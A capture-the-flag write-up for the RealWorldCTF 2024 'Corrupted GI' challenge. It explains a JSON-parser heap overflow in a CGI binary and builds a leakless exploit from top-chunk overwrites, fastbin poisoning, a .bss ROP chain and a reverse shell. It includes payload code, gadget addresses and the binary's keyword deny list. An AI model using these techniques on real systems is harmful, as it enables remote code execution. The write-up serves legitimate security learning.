# RealWorldCTF 2024 - Corrupted GI

**Summary**: Using a vulnerability in the json parser of a CGI binary to do leakless heap exploitation by overflowing into the top chunk, and then turning that into an arbitrary write and writing a stack-pivoting ROP chain into `.bss` that will later be triggered by protobuf unpack function.

This is a completely leakless exploit without any brute-forcing.

## Intro

I played in RealWorldCTF 2024 with MMM, and worked on this challenge together with my teammates. We didn't manage to solve it by the end of the competition, but we came pretty close to the final solution, and the day after the competition ended, I finalized the solution.

## Analysis and vulnerability

The only given files in the challenge were `login.cgi`, `Dockerfile`, and the placeholder `flag.txt`. I also extracted the libc and ld from the docker container and patched the binary to run with those into `login-patched.cgi`. It is using glibc 2.17.

The `login.cgi` program is a CGI binary that will be invoked by apache webserver. If we send a GET request, the binary is invoked with our query in the environment variable `QUERY_STRING`, but if we send a POST request, the webserver will set the `CONTENT_LENGTH` environment variable based on our request headers and then the program will call `fread()` on `stdin` to read that many bytes as input, which will be our request body. Because the program calls `fread()`, we can include null-bytes in our input if we send it via a POST request.

The program will first allocate a buffer to read our input payload into with `malloc`. Then, it will call `FUN_4047f0` to process our request. There are 3 important function calls in `FUN_4047f0`. First, it calls `FUN_4040ce`, which is `validate_input_for_bad_words()` in the decompilation below. Then, it calls `FUN_4020db`, which is `parse_json()` to parse the json formatting of our input, and then it calls `FUN_404548` or `check_json_decoded_payload` to process the decoded json object.

Decompilation of `FUN_4047f0`:

```C
void * process_request_string(undefined8 param_1)
{
  long lVar1;
  int iVar2;
  long lVar3;
  void *pvVar4;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  iVar2 = validate_input_for_bad_words(param_1);
  if (iVar2 != 0) {
    lVar3 = parse_json(param_1);
    if ((lVar3 == 0) || (*(int *)(lVar3 + 0x18) != 6)) {
      if (lVar3 != 0) {
        free_parsed_json(lVar3);
      }
    }
    else {
      iVar2 = check_json_decoded_payload(lVar3);
      if (iVar2 != 0) {
        pvVar4 = (void *)return_welcome_response(lVar3);
        goto LAB_0040488b;
      }
    }
  }
  pvVar4 = (void *)return_login_failed_response();
LAB_0040488b:
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return pvVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The `validate_input_for_bad_words()` function will call `strstr` to look for any of `bash`, `flag`, `cat`, `tcp`, `;`, `$`, `|`, `` ` ``, `&`, `#`, `(`, `)`, `\r`, `\n`, `\t`, and then it calls regex functions to verify that your input doesn't match `"\s*:\s*[`, or `"\s*:\s*{`, which is basically blocking nested json objects or lists. Remember that it checks these by using the `strlen` of the string as the size, so if we can somehow put some null-bytes in the beginning of our payload we can bypass this.

Then, `parse_json()` will attempt to decode our payload into a json object. If it fails or it detects a formatting error, it immediately frees the allocated objects on the heap. Otherwise, it will call `check_json_decoded_payload()`. The json decoding mechanism uses a linked-list of `json_object_t` structs that seem to have this format, reversed by @babaisflag:

```C
typedef struct {
    json_object_t *next;
    json_object_t *prev;
    json_object_t *parse_result;
    int type; // 0x18
              // 0: false, 1: true, 2: null, 3: number,
              // 4: quoted str, 5: [], 6: {}
    char* quote_string;
    int as_int; // 0x28
    double num_value; // 0x30
    char *key; // 0x38
} json_object_t;
```

`parse_json()` is a wrapper for `FUN_4021fb()` or `do_json_parsing()` to perform the actual parsing operations:

```C
char * do_json_parsing(long param_1,char *param_2)
{
  long lVar1;
  int iVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_2 == (char *)0x0) {
    pcVar3 = (char *)0x0;
  }
  else {
    iVar2 = strncmp(param_2,"null",4);
    if (iVar2 == 0) {
      *(undefined4 *)(param_1 + 0x18) = 2;
      pcVar3 = param_2 + 4;
    }
    else {
      iVar2 = strncmp(param_2,"false",5);
      if (iVar2 == 0) {
        *(undefined4 *)(param_1 + 0x18) = 0;
        pcVar3 = param_2 + 5;
      }
      else {
        iVar2 = strncmp(param_2,"true",4);
        if (iVar2 == 0) {
          *(undefined4 *)(param_1 + 0x18) = 1;
          *(undefined4 *)(param_1 + 0x28) = 1;
          pcVar3 = param_2 + 4;
        }
        else if (*param_2 == '\"') {
          pcVar3 = (char *)parse_double_quote(param_1,param_2);
        }
        else if ((*param_2 == '-') || (('/' < *param_2 && (*param_2 < ':')))) {
          pcVar3 = (char *)parse_dash_and_digits(param_1,param_2);
        }
        else if (*param_2 == '[') {
          pcVar3 = (char *)parse_square_brace(param_1,param_2);
        }
        else if (*param_2 == '{') {
          pcVar3 = (char *)parse_curly_brace(param_1,param_2);
        }
        else {
          pcVar3 = (char *)0x0;
          json_parser_error_location = param_2;
        }
      }
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return pcVar3;
}
```

The vulnerability is in the `parse_double_quotes` function above, which is used to parse strings in the json payload:
```C
byte * parse_double_quote(long param_1,char *param_2)
{
  byte *pbVar1;
  byte *pbVar2;
  long in_FS_OFFSET;
  uint unicode_number;
  int local_3c;
  byte *cur_ptr;
  byte *alloc_ptr;
  byte *allocated_buf;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  cur_ptr = (byte *)(param_2 + 1);
  local_3c = 0;
  pbVar2 = cur_ptr;
  if (*param_2 == '\"') {
	// This loop determines the size of the allocated buffer.
	// It skips 2 characters everytime it sees a backslash
	// and skips one character otherwise.
    while (((cur_ptr = pbVar2, *cur_ptr != 0x22 && (*cur_ptr != 0)) &&
           (local_3c = local_3c + 1, local_3c != 0))) {
      pbVar2 = cur_ptr + 1;
      if (*cur_ptr == 0x5c) {
        pbVar2 = cur_ptr + 2;
      }
    }
	// allocating the buffer for our string:
    allocated_buf = (byte *)malloc((long)(local_3c + 1));
    if (allocated_buf == (byte *)0x0) {
      pbVar2 = (byte *)0x0;
    }
    else {
      cur_ptr = (byte *)(param_2 + 1);
      alloc_ptr = allocated_buf;
      while ((*cur_ptr != 0x22 && (*cur_ptr != 0))) {
        if (*cur_ptr == 0x5c) {
          pbVar2 = cur_ptr + 1;
          switch(*pbVar2) {
          case 0x62:
            *alloc_ptr = 8;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
          default:
            *alloc_ptr = *pbVar2;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
          case 0x66:
            *alloc_ptr = 0xc;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
          case 0x6e:
            *alloc_ptr = 10;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
          case 0x72:
            *alloc_ptr = 0xd;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
          case 0x74:
            *alloc_ptr = 9;
            cur_ptr = pbVar2;
            alloc_ptr = alloc_ptr + 1;
            break;
		  // This is where it handles \u sequences in the string:
          case 0x75:
            pbVar1 = cur_ptr + 2;
            cur_ptr = pbVar2;
			// calls sscanf(str, "%4x", &unicode_number)
			// which will read **at most** 4 hex digits
            __isoc99_sscanf(pbVar1,&DAT_00455095,&unicode_number);
            local_3c = 3;
            if (unicode_number < 0x80) {
              local_3c = 1;
            }
            else if (unicode_number < 0x800) {
              local_3c = 2;
            }
            alloc_ptr = alloc_ptr + local_3c;
            if (local_3c == 2) {
LAB_00401d21:
              alloc_ptr = alloc_ptr + -1;
              *alloc_ptr = (byte)unicode_number & 0x3f | 0x80;
              unicode_number = unicode_number >> 6;
LAB_00401d40:
              alloc_ptr = alloc_ptr + -1;
              *alloc_ptr = (byte)unicode_number | (&UNK_0045508e)[local_3c];
            }
            else {
              if (local_3c == 3) {
                alloc_ptr = alloc_ptr + -1;
                *alloc_ptr = (byte)unicode_number & 0x3f | 0x80;
                unicode_number = unicode_number >> 6;
                goto LAB_00401d21;
              }
              if (local_3c == 1) goto LAB_00401d40;
            }
			// and then no matter how many hex digits
			// sscanf could read in the input string,
			// it will always skip the next 4 characters
			// after the \u in the input string.
            cur_ptr = cur_ptr + 4;
            alloc_ptr = alloc_ptr + local_3c;
          }
          cur_ptr = cur_ptr + 1;
        }
        else {
          *alloc_ptr = *cur_ptr;
          cur_ptr = cur_ptr + 1;
          alloc_ptr = alloc_ptr + 1;
        }
      }
      *alloc_ptr = 0;
      if (*cur_ptr == 0x22) {
        cur_ptr = cur_ptr + 1;
      }
      *(byte **)(param_1 + 0x20) = allocated_buf;
      *(undefined4 *)(param_1 + 0x18) = 4;
      pbVar2 = cur_ptr;
    }
  }
  else {
    pbVar2 = (byte *)0x0;
    json_parser_error_location = param_2;
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return pbVar2;
}
```

As you can see above, it just skips one character after any backslash when determining the length of the buffer to allocate, but then when handling `\u` sequences, it will always jump over the next 4 characters after `\u`. This means that if we have `\u""""AAAAAAAAA...` in the string, it will skip the `u` after the backslash but then stop at the `"` after it and determines the length of the buffer to allocate as only 1 or 2 bytes, but then when copying the string into the buffer, it will skip all four quotes after the `\u` and never sees them, and continues to copy all the `A`s into the allocated buffer, which will be a heap overflow. We could use null-bytes instead of the quotes as well, because it won't see them anyway and that can help us bypass the `strstr` and regex checks mentioned before.

However, exploiting this heap overflow is not easy because the buffer that is allocated for the string is always the most recent buffer allocated. Apparently, the heap is clean and there are no freed chunks in the bins to reuse when the json parsing begins (because somewhere in the `validate_input_for_bad_words` the program calls `malloc(0x2501)` which triggers `malloc_consolidate()` and clears all the fastbins on the heap). Also, in the json parsing process itself we never call `free()` on anything and the freeing only happens at the end if the parsing detects an error. So we can only overflow into the top chunk.

## Step 1: Heap exploitation

We used an idea similar to the first step of "House of Orange" to exploit this vulnerability. If we overwrite the size of the top chunk with something small using our overflow, and then request another chunk with `malloc` with a size that is larger than the current size of the top (that we overwrote), malloc will extend the heap area by calling `sbrk`, and then it will `free` the "old" top chunk, and place the new top chunk pointer at the beginning of the new heap area (where `sbrk` returns).

```
|========	0x800000 => the chunk we could write into with overflow
|
|========	0x800060 => the "old" top chunk, now just a normal chunk in the bins
|
|
|========	0x801000 => the end of the old top chunk if we overwrite its size with 0xfa1 before being freed
|
....
....
|         0x820ff8 => the last qword of the "real" old top chunk before its size was overwritten
|======== 0x821000 => the new top chunk at the beginning of the new heap area
|
....
```

So we can use this to create free'd chunks that we can later reuse for our strings so that our string buffers are allocated not just at the end of the heap and we can use the overflow in those buffers to overwrite the data/metadata of the other non-top chunks.

There are two things to be careful about when overwriting the size of the top chunk. First, the `PREV_INUSE` bit must always be set on the top chunk size. Second, the end of the top chunk (`av->top + chunksize(av->top)`) must always be page-aligned. However, apparently although I can see the check for the second requirement in glibc 2.17 source code, this libc binary doesn't seem to do those checks in our exploit. I don't exactly know the reason for this, but this means that we're not forced to overwrite our top chunk sizes with values that keep their end page-aligned, and therefore we can just overwrite them with small values for the size so when they are freed they end up in fastbins rather than unsorted bins, and our exploitation steps later are easier. However, even if this was not the case and we had to keep the top chunk ends page-aligned, we could probably still make sure that the freed top chunks end in fastbins by putting a padding buffer before the buffer that overwrites the top chunk size, so that the top chunk size becomes something close to a page-aligned address and then overwrite it with a small value to reach that page-aligned address. (for example, make the top chunk start at `0x800fa0`, and then overwrite its size with `0x61` so that its new end will be `0x801000`)

Here is the check in glibc 2.17 `sysmalloc()` for the top chunk end to be page-aligned: https://elixir.bootlin.com/glibc/glibc-2.17/source/malloc/malloc.c#L2366

Note that later in `check_json_decoded_payload()`, there are checks to make sure that there are only two types of key strings in the payload, `"timestamp"`, and `"data"`. Our attack relies on the protobuf function calls after those checks so I am using `data\\u0000AAAA...` as the key strings if I want to increase their size so that `strcmp` will still consider this key to be `data`.

This is the heap attack structure in the `exploit.py` file:

```python
payload = b'{"timestamp": 1050000'  # [1]
payload += b', "data": "%s"' % write_top_1_size # [2]
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x20, write_top_2_size) # [3]
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, reallocate_top_1) # [4]
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, reallocate_top_2) # [5]
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, write_in_bss)     # [6]
payload = payload.ljust(0x20000, b" ")  # [7]
payload += b'}'
```

1. Just a large timestamp value so that a check in the `check_json_decoded_payload()` passes (it just checks that the timestamp is at least some constant value).

2. This chunk will write the size of the first top chunk with `0x41`. Then, after an 0x50-sized chunk is allocated by `parse_curly_braces` to contain the `json_object_t` struct for the next key-value pair, as `0x50` is larger than the modified top size, this top chunk will be freed and a new top will be allocated at offset `0x21000` of the heap as explained before. Note that two 0x10-sized "fencepost" chunks will be placed at the end of the freed top chunk, so the size of the "old" top chunk that is added to the fastbins will eventually be `0x20`.

3. This string will overflow again now into the second top chunk (the new top chunk) and overwrite its size with `0x61`. Then another `malloc(0x40)` to allocate the next `json_object_t` struct will cause another `sysmalloc()` call and the second top chunk will also be freed into an 0x40-sized fastbin and 2 0x10-sized fencepost chunks, and a third top chunk will be allocated at offset `0x43000` of the heap base. (`sysmalloc()` is called because the requested chunk size plus the size of the two fencepost chunks is more than the size of the top chunk).
Note that I am increasing the size of the key string in this key-value pair (and also adding 32 A's at the beginning of the value string) to prevent them from reusing the old top chunk that is now in the fastbins.

4. The `reallocate_top_1` string will cause a `malloc` call with a size of 1 or 2, so malloc will return the first freed top chunk this time. Now by overflowing after the end of this chunk, we can write the whole ~0x21000 bytes to the second top chunk, and then overwrite the `fd` pointer of the second top chunk (that is now freed and in the `0x40` fastbin).
Note that the `fake_json_struct` string in the middle of `reallocate_top_1` string is there because one of the `json_object_t` structs is allocated right before the second top chunk, and if we just overwrite this distance with random letters, we will overwrite the string pointers in that struct that are later passed to `strcmp` and will cause segfault. So we just need to be careful to overwrite that `json_object_t` struct with valid pointers, and I'm just pointing all of its string pointers to the `"data"` string in program `.rodata`, and it's linked-list pointers to 0 to terminate the linked list of json structs.

5. `reallocate_top_2` is just a string that will result in the 0x40-sized fastbin of the second top chunk to be reallocated by malloc, so the arbitrary value that we wrote into its `fd` pointer in step 4 is now in the fastbin head.

6. Now another malloc of the same size will return the arbitrary address that we previously wrote into the `fd` of the second freed top chunk. I set this address to be `0x67607a`, which is an address of a fake chunk with suitable size metadata for an 0x40-sized fastbin to be allocated, and then we have arbitrary write in the data section of the binary. We will write our ROP chain in the data section (I will later discuss how the ROP chain works).

7. This line will make no difference in the working of the json parser because it will just skip whitespace between tokens, but it just makes the size of our input payload be larger than `MMAP_THRESHOLD`, so when the program allocated a chunk of size `CONTENT_LENGTH` to put our input into, that chunk will be allocated with `mmap` and the small differences in the size of our input do not shift around the heap and change the sizes and offsets that we need.

## Step 2: ROP chain

Now that we used the heap overflow to gain arbitrary write in the data section, we can write our ROP chain there.

@nneonneo suggested that we could write our ROP-chain into the address `0x6760b0`, which seems to hold function pointers to the functions that protobuf will use for `malloc`/`free`.

Our ROP chain will be later triggered by `protobuf_unpack` function, so let's take a look at what happens there.

This is the decompilation of parts of `check_json_decoded_payload()`, or `FUN_404548`:

```C
undefined8 check_json_decoded_payload(long param_1)
{
  // ....
  // checking that we only have "timestamp" and "data" as the keys in the json payload
  for (local_50 = *(undefined8 **)(param_1 + 0x10); local_50 != (undefined8 *)0x0;
      local_50 = (undefined8 *)*local_50) {
    iVar2 = strcmp((char *)local_50[7],"data");
    if (iVar2 != 0) {
      iVar2 = strcmp((char *)local_50[7],"timestamp");
      if (iVar2 != 0) {
        uVar5 = 0;
        goto LAB_004047d5;
      }
    }
  }
  lVar3 = json_get_value_for_key_maybe(param_1,"data");
  if ((lVar3 != 0) && (*(int *)(lVar3 + 0x18) == 4)) {  // checking that the type of the value for "data" is string
    lVar4 = json_get_value_for_key_maybe(param_1,"timestamp");
    if ((lVar4 != 0) && (*(int *)(lVar4 + 0x18) == 3)) {  // checking that the type of the value of "timestamp" is number
      if (*(int *)(lVar4 + 0x28) < 0xf1a9) {  // checking that the timestamp is at least some constant value
        uVar5 = 0;
        goto LAB_004047d5;
      }
      __s = *(char **)(lVar3 + 0x20);
      sVar6 = strlen(__s);
      iVar2 = (int)sVar6 + 1;
      __s_00 = malloc((long)iVar2);
      memset(__s_00,0,(long)iVar2);
      // probably some base32 decoding function, but it
      // doesn't really affect our exploit so we don't care about it.
      iVar2 = base32_decode_maybe(__s,__s_00,iVar2);
      if (iVar2 < 0) {
        free(__s_00);
      }
      else {
        // This is where the p
        lVar3 = protobuf_unpack(0,(long)iVar2,__s_00);
        // ....
      }
    }
  }
  // ....
}
```

We can see that it calls `protobuf_unpack`, or `FUN_404b36`, with the first argument of zero. Then:

```C
void protobuf_deserialize_maybe(undefined8 param_1,undefined8 param_2,undefined8 param_3)
{
  // ...
  internal_protobuf_unpack(&DAT_00455740,param_1,param_2,param_3);
  // ...
}
```

So this is also calling `internal_protobuf_unpack`, or `FUN_408490` with its second argument being 0:

```C
int ** internal_protobuf_unpack
                 (int *param_1,undefined **param_2,ulong param_3,byte *param_4)
{
  // just some unimportant checks on some constant stuff in rodata that are passed in param_1
  lVar29 = *(long *)(param_1 + 0xe);
  if (*param_1 != 0x28aaeef9) {
    __assert_fail("(desc)->magic == 0x28aaeef9","protobuf-c/protobuf-c.c",0xa92,
                  "protobuf_c_message_unpack");
  }
  // if the second argument is 0, it will set it to 0x6760b0
  if ((code **)param_2 == (code **)0x0) {
    param_2 = &PTR_FUN_006760b0;
  }
  // calling the function pointer written at 0x6760b0 with rdi being the value written at 0x6760c0
  __s = (int **)(*(code *)*param_2)(((code **)param_2)[2]);
  // ....
```

This is a huge function, but we can see that right in the beginning, it will load a function pointer from `0x6760b0` in the data section, and then loads the first argument for this function from `0x6760c0` into `rdi`, and calls this function. We have arbitrary write in the data section so we can overwrite this function pointer and its argument!!!

The gadget `push rsi ; idiv bh ; jmp qword ptr [rsi + 0xf]` is a very useful gadget to do stack pivoting. However, we can't control `rsi` yet. By breaking right before the indirect call in `internal_protobuf_unpack` and observing the values of the registers, we can see that both `rax` and `rbx` have the value `0x6760b0`, and rdi has whatever value we write at `0x6760c0`. So by using `mov rsi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]` as another gadget, we can mov the value at `0x6760c0` into `rsi` as well. Then, also note that there is an `idiv bh` instruction in the original stack-pivoting gadget. Apparently, `idiv bh` will fail with an arithmetic exception if both of `ah` and `al` are non-zero. So we will use the gadget `and ah, byte ptr [rdi - 1] ; jmp qword ptr [rsi - 0x70]` to make `ah` zero and avoid terminating.

This is the stack pivoting plan:

```
initial rax -> 0x6760b0: 0x00000000004111d1 => mov rsi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]
               0x6760b8: 0x0000000000426eda => and ah, byte ptr [rdi - 1] ; jmp qword ptr [rsi - 0x70]
               0x6760c0: 0x676138 => initial rdi value
               0x6760c8: 0x0000000000452b16 => push rsi ; idiv bh ; jmp qword ptr [rsi + 0xf]
               0x6760d0: 0x0
               0x6760d8: 0x0
               ....
               0x676130: 0x0
               0x676138: 0xf bytes of junk and then 0x0000000000404cb1 => pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
               ....
               0x676150: main ROP chain starts here
               ....
```

The main ROP chain will use gadgets mentioned in the exploit script to load the address of `puts` from its GOT entry and then add a constant offset to that to calculate the address of `execve` and then prepare the `argv` array for `execve` and call it.

Running a command like `/bin/cat /flag.txt` will work locally but for some reason although we're using `execve`, the webserver will return a server error (HTTP 5xx) and not show us the output. So I used a reverse-shell command and ngrok to get a reverse shell from the server and read the flag.

## Conclusion

This was an extremely fun challenge, and a huge learning opportunity! I truly enjoyed working on this challenge, and learned a lot about heap exploitation and advanced ROP, both from hearing the ideas of others and coming up with ideas myself, and from connecting all the parts together to write the final exploit!
